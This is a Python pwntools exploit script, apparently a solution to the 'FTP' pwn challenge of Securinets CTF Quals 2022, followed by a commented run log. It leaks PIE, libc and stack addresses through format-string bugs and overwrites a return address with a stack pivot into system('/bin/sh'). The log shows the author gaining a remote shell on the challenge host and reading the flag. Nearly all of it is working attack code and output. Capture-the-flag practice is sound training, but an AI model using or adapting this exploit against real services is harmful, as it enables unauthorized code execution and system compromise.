from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './ftp'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "20.216.39.14"
  PORT = 1234
  s = remote(HOST, PORT)
  libc = ELF("./libc6_2.31-0ubuntu9.7_i386.so")
  stack_pivot_offset = 0x000f3357 # add esp, 0xd4; pop ebx; pop esi; ret;
else:
  s = process(BINARY)
  libc = elf.libc
  stack_pivot_offset = 0x000e8463 # add esp, 0xd4; pop ebx; pop esi; ret;

s.sendlineafter("): ", "anonymous")
s.sendlineafter("Password: ", "")

s.sendlineafter("ftp> ", "put %9$p")
s.sendlineafter("ftp> ", "cat note")

pie_leak = int(s.recvuntil("\n"), 16)
pie_base = pie_leak - 0x218c

print "pie_leak =", hex(pie_leak)
print "pie_base =", hex(pie_base)

buf = p32(pie_base + elf.got.puts) + "%43$s"
s.sendlineafter("ftp> ", "put "+ buf)
s.sendlineafter("ftp> ", "cat note")

s.recv(4)
puts_addr = u32(s.recv(4))
libc_base = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))
stack_pivot = libc_base + stack_pivot_offset
print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "stack_pivot =", hex(stack_pivot)

s.sendlineafter("ftp> ", "put %24$p")
s.sendlineafter("ftp> ", "cat note")

stack_leak = int(s.recvuntil("\n"), 16)
print "stacks_leak =", hex(stack_leak)

return_addr = stack_leak - 0x100
index = 43

# stack pivot
writes = {return_addr: stack_pivot}
buf  = fmtstr_payload(index, writes, write_size='short')
buf += "A"*(0x30-len(buf))
buf += p32(system_addr)
buf += "BBBB"
buf += p32(binsh_addr)

s.sendlineafter("ftp> ", "put "+ buf)
s.sendlineafter("ftp> ", "cat note")

s.interactive()

'''
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_FTP$ python solve.py r
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_FTP/ftp'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 20.216.39.14 on port 1234: Done
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_FTP/libc6_2.31-0ubuntu9.7_i386.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_leak = 0x5659718c
pie_base = 0x56595000
puts_addr   = 0xf7aadc30
libc_base   = 0xf7a40000
stack_pivot = 0xf7b33357
stacks_leak = 0xffae5e7c
[*] Switching to interactive mode

id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 48
-rw-rw-r-- 1 root root    61 Apr  9 03:09 flag.txt
-rw-r--r-- 1 ctf  ctf     60 Apr 10 01:12 note
-rwsrwxr-x 1 root ctf  16860 Apr  9 02:30 task4
-rwxrwxr-x 1 root root 18744 Apr  9 02:30 ynetd
$ cat flag.txt
Securinets{b554948c19c146bb98c8567b97bd9e111c9a1a3be03a94f1}
'''
